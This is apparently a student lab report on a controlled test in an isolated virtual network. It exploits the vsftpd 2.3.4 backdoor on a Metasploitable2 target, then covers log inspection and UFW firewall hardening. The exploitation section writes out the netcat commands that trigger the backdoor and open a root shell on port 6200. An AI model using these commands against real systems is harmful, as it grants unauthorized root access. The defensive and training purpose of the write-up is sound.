# Task 5: Capstone Project & Incident Response Report

## 📋 Project Overview
This repository contains the complete documentation, technical execution steps, and evidence for Task 5, focusing on a controlled penetration test against a vulnerable service, subsequent log-based incident detection, and host-based firewall threat containment.

---

## 🌐 Lab Environment & Scope
* **Attacker Machine:** Kali Linux (`192.168.56.101`)
* **Target Machine:** Metasploitable2 (`192.168.56.102`)
* **Network Architecture:** Host-Only Virtual Network (`192.168.56.0/24`)
* **Target Vulnerability:** `vsftpd 2.3.4` (Backdoor Command Execution)

---

## 🚀 Phase 1: Planning & Scope Definition
* **Objective:** Perform a controlled vulnerability assessment and exploit verification, followed by defensive incident response and hardening.
* **Tools Used:** Netcat (`nc`), FTP client, UFW (Uncomplicated Firewall), Linux system logging (`/var/log/syslog`).

---

## 💻 Phase 2: Exploitation & Evidence (Root Access)
1. **Backdoor Trigger:** Connected to the target FTP service on port 21 and triggered the `vsftpd 2.3.4` smiley-face backdoor using a malicious username payload:
   ```bash
   nc 192.168.56.102 21
   USER test:)
   PASS password
   Shell Access: Connected directly to the spawned administrative backdoor port:

Bash
nc 192.168.56.102 6200
Privilege Verification: Executed whoami, which successfully returned root, confirming full administrative access.

Figure: Successful root shell access verification via backdoor port 6200.

🛡️ Phase 3: Incident Response & Hardening
3.1 Incident Detection (Log Analysis)
Inspected the target system's logs to locate intrusion and service connection artifacts:

Bash
grep -i "vsftpd" /var/log/syslog
Figure: System log output showing xinetd managing the vsftpd daemon service.

3.2 Threat Containment & Firewall Hardening
Configured and activated a host-based firewall using UFW to lock down unauthorized inbound access while maintaining administrative SSH connectivity:

Bash
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw enable
ufw status verbose
Firewall Status Result: Status is active with a default incoming deny policy[cite: 1].

Figure: UFW status confirming active threat containment and rules.

📌 Conclusion & Mitigation Summary
Root Cause: Use of an outdated, vulnerable FTP daemon version containing a hardcoded backdoor vulnerability (vsftpd 2.3.4).

Remediation Implemented: Applied host-based network segmentation and filtering via UFW firewall rules, restricting traffic while keeping essential administration ports secure.
